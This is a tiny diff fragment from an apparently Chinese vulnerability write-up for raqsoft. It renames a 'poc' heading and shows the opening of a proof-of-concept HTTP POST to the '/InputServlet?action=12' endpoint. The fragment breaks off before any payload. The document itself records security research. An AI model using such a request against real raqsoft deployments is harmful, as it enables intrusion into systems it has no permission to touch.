@@ -2,7 +2,7 @@
 
 环境：https://github.com/charlesvhe/raqsoft
 
-## poc
+## POC
 ```
 POST /InputServlet?action=12 HTTP/1.1
 Host: 127.0.0.1:8080
